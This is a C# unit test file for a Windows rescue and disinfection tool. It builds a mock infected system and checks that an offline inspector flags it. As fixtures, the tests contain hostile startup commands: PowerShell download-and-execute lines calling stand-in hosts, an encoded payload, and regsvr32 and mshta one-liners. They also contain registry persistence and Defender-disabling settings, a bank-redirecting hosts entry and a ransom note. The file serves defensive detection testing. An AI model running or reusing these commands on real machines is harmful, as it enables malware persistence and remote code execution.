using System.Buffers.Binary;
using System.Text;
using PCDoctor.Rescue;

namespace PCDoctor.Tests;

/// <summary>Construye colmenas de registro (regf) mínimas para armar escenarios de prueba del modo rescate.</summary>
internal sealed class TestHive
{
    public sealed class Key
    {
        public string Name = "";
        public List<Key> Children = new();
        public List<(string Name, int Type, byte[] Data)> Values = new();

        public Key Sub(string path)
        {
            var k = this;
            foreach (var part in path.Split('\\'))
            {
                var next = k.Children.FirstOrDefault(c => c.Name == part);
                if (next is null) { next = new Key { Name = part }; k.Children.Add(next); }
                k = next;
            }
            return k;
        }

        public Key Str(string name, string value) { Values.Add((name, 1, Encoding.Unicode.GetBytes(value + "\0"))); return this; }
        public Key Dword(string name, int value) { var b = new byte[4]; BinaryPrimitives.WriteInt32LittleEndian(b, value); Values.Add((name, 4, b)); return this; }
    }

    public readonly Key Root = new() { Name = "ROOT" };
    private readonly MemoryStream _cells = new();

    public void Save(string path)
    {
        _cells.SetLength(0);
        _cells.Write(new byte[32]); // cabecera del hbin
        var root = WriteKey(Root);
        var size = (int)((_cells.Length + 4095) / 4096 * 4096);
        var hbin = new byte[size];
        _cells.ToArray().CopyTo(hbin, 0);
        Encoding.ASCII.GetBytes("hbin").CopyTo(hbin, 0);
        BinaryPrimitives.WriteInt32LittleEndian(hbin.AsSpan(8), size);
        if (size > _cells.Length) // el resto del hbin es una celda libre
            BinaryPrimitives.WriteInt32LittleEndian(hbin.AsSpan((int)_cells.Length), size - (int)_cells.Length);
        var header = new byte[4096];
        Encoding.ASCII.GetBytes("regf").CopyTo(header, 0);
        BinaryPrimitives.WriteInt32LittleEndian(header.AsSpan(0x14), 1);
        BinaryPrimitives.WriteInt32LittleEndian(header.AsSpan(0x18), 5);
        BinaryPrimitives.WriteInt32LittleEndian(header.AsSpan(0x24), root);
        BinaryPrimitives.WriteInt32LittleEndian(header.AsSpan(0x28), size);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, header.Concat(hbin).ToArray());
    }

    private int Cell(byte[] data)
    {
        var offset = (int)_cells.Length;
        var size = (data.Length + 4 + 7) / 8 * 8;
        var buf = new byte[size];
        BinaryPrimitives.WriteInt32LittleEndian(buf, -size);
        data.CopyTo(buf, 4);
        _cells.Write(buf);
        return offset;
    }

    private int WriteKey(Key key)
    {
        var children = key.Children.Select(WriteKey).ToList();
        var list = -1;
        if (children.Count > 0)
        {
            var lf = new byte[4 + children.Count * 8];
            Encoding.ASCII.GetBytes("lf").CopyTo(lf, 0);
            BinaryPrimitives.WriteUInt16LittleEndian(lf.AsSpan(2), (ushort)children.Count);
            for (var i = 0; i < children.Count; i++) BinaryPrimitives.WriteInt32LittleEndian(lf.AsSpan(4 + i * 8), children[i]);
            list = Cell(lf);
        }
        var valueOffsets = key.Values.Select(v =>
        {
            var name = Encoding.Latin1.GetBytes(v.Name);
            var vk = new byte[0x14 + name.Length];
            Encoding.ASCII.GetBytes("vk").CopyTo(vk, 0);
            BinaryPrimitives.WriteUInt16LittleEndian(vk.AsSpan(2), (ushort)name.Length);
            if (v.Data.Length <= 4)
            {
                BinaryPrimitives.WriteUInt32LittleEndian(vk.AsSpan(4), 0x80000000u | (uint)v.Data.Length);
                v.Data.CopyTo(vk, 8);
            }
            else
            {
                BinaryPrimitives.WriteInt32LittleEndian(vk.AsSpan(4), v.Data.Length);
                BinaryPrimitives.WriteInt32LittleEndian(vk.AsSpan(8), Cell(v.Data));
            }
            BinaryPrimitives.WriteInt32LittleEndian(vk.AsSpan(0x0C), v.Type);
            BinaryPrimitives.WriteUInt16LittleEndian(vk.AsSpan(0x10), 1);
            name.CopyTo(vk, 0x14);
            return Cell(vk);
        }).ToList();
        var values = -1;
        if (valueOffsets.Count > 0)
        {
            var vl = new byte[valueOffsets.Count * 4];
            for (var i = 0; i < valueOffsets.Count; i++) BinaryPrimitives.WriteInt32LittleEndian(vl.AsSpan(i * 4), valueOffsets[i]);
            values = Cell(vl);
        }
        var nameBytes = Encoding.Latin1.GetBytes(key.Name);
        var nk = new byte[0x4C + nameBytes.Length];
        Encoding.ASCII.GetBytes("nk").CopyTo(nk, 0);
        BinaryPrimitives.WriteUInt16LittleEndian(nk.AsSpan(2), 0x20);
        BinaryPrimitives.WriteInt32LittleEndian(nk.AsSpan(0x14), children.Count);
        BinaryPrimitives.WriteInt32LittleEndian(nk.AsSpan(0x1C), list);
        BinaryPrimitives.WriteInt32LittleEndian(nk.AsSpan(0x24), valueOffsets.Count);
        BinaryPrimitives.WriteInt32LittleEndian(nk.AsSpan(0x28), values);
        BinaryPrimitives.WriteUInt16LittleEndian(nk.AsSpan(0x48), (ushort)nameBytes.Length);
        nameBytes.CopyTo(nk, 0x4C);
        return Cell(nk);
    }
}

public class RescueTests
{
    private static string NewDir() => Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "PCDoctorRescate", Guid.NewGuid().ToString("N"))).FullName;

    [Fact]
    public void ReadsARealWindowsRegistryFile()
    {
        // El perfil predeterminado de Windows es una colmena real que cualquier usuario puede leer.
        var path = @"C:\Users\Default\NTUSER.DAT";
        if (!File.Exists(path)) return;
        var hive = RegistryHive.TryOpen(path);
        Assert.NotNull(hive);
        var env = hive!.Open("Environment");
        Assert.NotNull(env);
        Assert.Equal(@"%USERPROFILE%\AppData\Local\Temp", env!.GetString("TEMP"), ignoreCase: true);
        Assert.True(hive.Open(@"Software\Microsoft\Windows\CurrentVersion")!.SubKeys().Count() > 5);
        Assert.NotNull(hive.Open(@"control panel\desktop")); // sin distinguir mayúsculas, como Windows
    }

    [Fact]
    public void RejectsFilesThatAreNotRegistryHives()
    {
        var dir = NewDir();
        File.WriteAllText(Path.Combine(dir, "x"), "no soy un registro");
        Assert.Null(RegistryHive.TryOpen(Path.Combine(dir, "x")));
        Assert.Null(RegistryHive.TryOpen(Path.Combine(dir, "no-existe")));
    }

    [Theory]
    [InlineData(@"powershell -nop -w hidden -c ""iex (New-Object Net.WebClient).DownloadString('http://x.example/a')""")]
    [InlineData(@"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=")]
    [InlineData(@"wscript.exe ""C:\Users\Juan\AppData\Roaming\upd.vbs""")]
    [InlineData(@"mshta vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run"")")]
    [InlineData(@"C:\Users\Juan\AppData\Local\Temp\svchost.exe")]
    [InlineData(@"C:\Users\Public\factura.pdf.exe")]
    [InlineData(@"regsvr32 /s /n /u /i:https://x.example/a.sct scrobj.dll")]
    public void FlagsTypicalMalwareStartupCommands(string command) => Assert.NotNull(OfflineInspector.WhySuspicious(command));

    [Theory]
    [InlineData(@"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background")]
    [InlineData(@"C:\Program Files\Realtek\Audio\HDA\RtkAudUService64.exe -background")]
    [InlineData(@"""C:\Users\Juan\AppData\Local\Microsoft\Teams\Update.exe"" --processStart ""Teams.exe""")]
    [InlineData(@"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe""")]
    [InlineData(@"%windir%\system32\SecurityHealthSystray.exe")]
    public void DoesNotFlagNormalStartupPrograms(string command) => Assert.Null(OfflineInspector.WhySuspicious(command));

    /// <summary>Un Windows de mentira con las trampas típicas de un virus y de un estafador.</summary>
    private static string BuildInfectedWindows()
    {
        var root = NewDir();
        var software = new TestHive();
        software.Root.Sub(@"Microsoft\Windows\CurrentVersion\Run")
            .Str("SecurityHealth", @"%windir%\system32\SecurityHealthSystray.exe")
            .Str("Updater", @"powershell -w hidden -c ""iex (iwr http://malo.example/x)""");
        software.Root.Sub(@"Microsoft\Windows NT\CurrentVersion\Winlogon").Str("Shell", "explorer.exe, C:\\ProgramData\\shell.exe").Str("Userinit", @"C:\Windows\system32\userinit.exe,");
        software.Root.Sub(@"Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe").Str("Debugger", @"C:\ProgramData\x.exe");
        software.Root.Sub(@"Policies\Microsoft\Windows Defender").Dword("DisableAntiSpyware", 1);
        software.Root.Sub(@"Microsoft\Windows Defender\Exclusions\Paths").Dword(@"C:\", 0);
        software.Save(Path.Combine(root, @"Windows\System32\config\SOFTWARE"));

        var system = new TestHive();
        system.Root.Sub("Select").Dword("Current", 1);
        system.Root.Sub(@"ControlSet001\Services\Spooler").Str("ImagePath", @"%SystemRoot%\System32\spoolsv.exe");
        system.Root.Sub(@"ControlSet001\Services\WinSvcHelper").Str("ImagePath", @"C:\Users\Juan\AppData\Roaming\helper\svc.exe");
        system.Root.Sub(@"ControlSet001\Services\AnyDesk").Str("ImagePath", @"""C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --service");
        system.Save(Path.Combine(root, @"Windows\System32\config\SYSTEM"));

        var user = new TestHive();
        user.Root.Sub(@"Software\Microsoft\Windows\CurrentVersion\Run")
            .Str("OneDrive", @"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background")
            .Str("Factura", @"C:\Users\Juan\AppData\Local\Temp\factura.pdf.exe");
        user.Save(Path.Combine(root, @"Users\Juan\NTUSER.DAT"));

        var startup = Directory.CreateDirectory(Path.Combine(root, @"Users\Juan\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")).FullName;
        File.WriteAllText(Path.Combine(startup, "upd.vbs"), "WScript.Echo 1");
        File.WriteAllText(Path.Combine(startup, "desktop.ini"), "");

        var tasks = Directory.CreateDirectory(Path.Combine(root, @"Windows\System32\Tasks\Microsoft\Windows\Defrag")).FullName;
        File.WriteAllText(Path.Combine(tasks, "ScheduledDefrag"), Task(@"%windir%\system32\defrag.exe", "-c -h -o"), Encoding.Unicode);
        File.WriteAllText(Path.Combine(root, @"Windows\System32\Tasks\GoogleUpdaterX"), Task("powershell.exe", "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="), Encoding.Unicode);

        Directory.CreateDirectory(Path.Combine(root, @"Program Files (x86)\AnyDesk"));
        Directory.CreateDirectory(Path.Combine(root, @"Windows\System32\drivers\etc"));
        File.WriteAllText(Path.Combine(root, @"Windows\System32\drivers\etc\hosts"), "# hosts\n127.0.0.1 localhost\n6.6.6.6 www.bancoejemplo.com.ar\n");
        Directory.CreateDirectory(Path.Combine(root, @"Users\Juan\Desktop"));
        File.WriteAllText(Path.Combine(root, @"Users\Juan\Desktop\HOW_TO_DECRYPT.txt"), "All your files have been encrypted. Pay 0.1 bitcoin to recover them.");
        Directory.CreateDirectory(Path.Combine(root, @"Users\Public\Desktop"));
        return root;
    }

    private static string Task(string command, string args) =>
        $"<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Actions><Exec><Command>{command}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>";

    [Fact]
    public void OfflineInspectionFindsEveryTrapAndLeavesNormalThingsAlone()
    {
        var root = BuildInfectedWindows();
        Assert.True(OfflineInspector.LooksLikeWindows(root));
        var inspector = new OfflineInspector(root);
        Assert.Equal(["Juan"], inspector.UserProfiles().Select(u => u.User));
        var f = inspector.Inspect();
        var bad = f.Where(x => x.Severity == Severity.Suspicious).Select(x => x.Where + " | " + x.What).ToList();

        Assert.Contains(bad, x => x.Contains("«Updater»"));
        Assert.Contains(bad, x => x.Contains("«Factura»"));
        Assert.Contains(bad, x => x.StartsWith("Inicio de sesión") && x.Contains("Shell"));
        Assert.Contains(bad, x => x.Contains("taskmgr.exe"));
        Assert.Contains(bad, x => x.StartsWith("Microsoft Defender") && x.Contains("política"));
        Assert.Contains(bad, x => x.StartsWith("Exclusiones") && x.Contains(@"C:\"));
        Assert.Contains(bad, x => x.Contains("WinSvcHelper"));
        Assert.Contains(bad, x => x.Contains("upd.vbs"));
        Assert.Contains(bad, x => x.Contains("GoogleUpdaterX"));
        Assert.Contains(bad, x => x.StartsWith("Archivo hosts"));
        Assert.Contains(bad, x => x.Contains("HOW_TO_DECRYPT"));
        Assert.Contains(f, x => x.Severity == Severity.Warning && x.Where == "Programas de control remoto" && x.What.StartsWith("AnyDesk"));

        // Lo normal no se marca como sospechoso.
        Assert.DoesNotContain(bad, x => x.Contains("SecurityHealth") || x.Contains("OneDrive") || x.Contains("Spooler") || x.Contains("Defrag") || x.Contains("Userinit") || x.Contains("desktop.ini") || x.Contains("localhost"));
        // El ejecutable del virus se ubica en el disco montado para poder analizarlo o aislarlo.
        Assert.Contains(f, x => x.What.Contains("WinSvcHelper") && x.FilePath is null); // no existe el archivo: no se inventa
    }

    [Fact]
    public void FindsTheExecutableBehindAStartupCommand()
    {
        var root = BuildInfectedWindows();
        var exe = Directory.CreateDirectory(Path.Combine(root, @"Users\Juan\AppData\Roaming\helper")).FullName;
        File.WriteAllText(Path.Combine(exe, "svc.exe"), "MZ");
        var inspector = new OfflineInspector(root);
        Assert.Equal(Path.Combine(exe, "svc.exe"), inspector.ExecutableOf(@"C:\Users\Juan\AppData\Roaming\helper\svc.exe -k run"), ignoreCase: true);
        Assert.Equal(Path.Combine(exe, "svc.exe"), inspector.ExecutableOf(@"""C:\Users\Juan\AppData\Roaming\helper\svc.exe"" -k"), ignoreCase: true);
        Assert.Null(inspector.ExecutableOf("rundll32.exe shell32.dll,Control_RunDLL"));
        var finding = inspector.Inspect().Single(x => x.What.Contains("WinSvcHelper"));
        Assert.NotNull(finding.FilePath);
    }

    [Fact]
    public void RescuesPersonalFilesAndResumesWithoutCopyingTwice()
    {
        var root = BuildInfectedWindows();
        Directory.CreateDirectory(Path.Combine(root, @"Users\Juan\Pictures\Vacaciones"));
        File.WriteAllBytes(Path.Combine(root, @"Users\Juan\Pictures\Vacaciones\playa.jpg"), new byte[300_000]);
        Directory.CreateDirectory(Path.Combine(root, @"Users\Juan\Documents"));
        File.WriteAllText(Path.Combine(root, @"Users\Juan\Documents\receta.txt"), "torta");
        var plan = FileRescue.Plan(new OfflineInspector(root));
        Assert.Contains(plan.Items, i => i.Folder == "Pictures");
        Assert.True(plan.TotalBytes >= 300_000);

        var dest = NewDir();
        var first = FileRescue.Copy(plan, dest);
        Assert.Equal(0, first.Failed);
        Assert.True(File.Exists(Path.Combine(dest, "Juan", "Pictures", "Vacaciones", "playa.jpg")));
        Assert.Equal("torta", File.ReadAllText(Path.Combine(dest, "Juan", "Documents", "receta.txt")));
        Assert.Empty(Directory.EnumerateFiles(dest, "*.parcial", SearchOption.AllDirectories));

        var again = FileRescue.Copy(plan, dest);
        Assert.Equal(0, again.Copied);
        Assert.Equal(first.Copied, again.Skipped);
        Assert.True(File.Exists(Path.Combine(root, @"Users\Juan\Pictures\Vacaciones\playa.jpg"))); // el origen no se toca
    }

    [Fact]
    public void QuarantineIsReversibleAndKeepsTheFileHarmless()
    {
        var root = NewDir();
        var virus = Path.Combine(root, @"Users\Juan\Downloads\premio.exe");
        Directory.CreateDirectory(Path.GetDirectoryName(virus)!);
        var content = Encoding.ASCII.GetBytes("MZ falso virus de prueba");
        File.WriteAllBytes(virus, content);

        var qdir = NewDir();
        var q = new Quarantine(qdir);
        var entry = q.Isolate(virus, root, "uuid-1", "Win.Test.EICAR");
        Assert.False(File.Exists(virus));
        var stored = File.ReadAllBytes(Directory.EnumerateFiles(qdir, "*.cuarentena").Single());
        Assert.NotEqual(content, stored); // guardado codificado: no se puede abrir ni ejecutar por accidente
        Assert.Single(q.List());
        Assert.Equal(@"Users\Juan\Downloads\premio.exe".Replace('\\', Path.DirectorySeparatorChar), entry.RelativePath);

        q.Restore(entry, root);
        Assert.Equal(content, File.ReadAllBytes(virus));
        Assert.Empty(q.List());
    }
}
